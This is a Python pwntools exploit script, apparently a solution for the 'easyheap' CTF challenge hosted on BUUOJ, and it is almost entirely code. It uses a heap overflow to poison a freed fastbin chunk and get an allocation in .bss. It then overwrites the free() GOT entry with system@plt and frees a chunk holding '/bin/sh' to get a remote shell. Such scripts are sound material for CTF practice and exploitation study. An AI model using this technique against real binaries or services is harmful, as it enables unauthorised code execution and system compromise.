from pwn import *
context(arch='amd64', log_level='debug')

# io = process('./easyheap')
elf = ELF('./easyheap')
io = remote('node4.buuoj.cn', 28974)

def create(size, content):
	io.sendlineafter(b'Your choice :', b'1')
	io.sendlineafter(b'Size of Heap : ', str(size).encode())
	io.sendlineafter(b'Content of heap:', content)

def edit(index, size, content):
	io.sendlineafter(b'Your choice :', b'2')
	io.sendlineafter(b'Index :', str(index).encode())
	io.sendlineafter(b'Size of Heap : ', str(size).encode())
	io.sendlineafter(b'Content of heap :', content)

def delete(index):
	io.sendlineafter(b'Your choice :', b'3')
	io.sendlineafter(b'Index :', str(index).encode())

create(0x40, b'colin')		# chunk #0
create(0x60, b'colin')		# chunk #1
delete(1)
edit(0, 0x100, cyclic(0x40) + p64(0) + p64(0x71) + p64(0x6020B5 - 8))	# overflow chunk #1
create(0x60, b'colin')	# new chunk #1
create(0x60, b'\x00' * 3 + p64(0) * 4 + p64(elf.got['free']))	# alloc chunk in bss, overflow chunk #0
edit(0, 0x8, p64(elf.plt['system']))		# edit free().got to system().plt
create(0x60, b'/bin/sh')
delete(3)	# system('/bin/sh')
io.interactive()
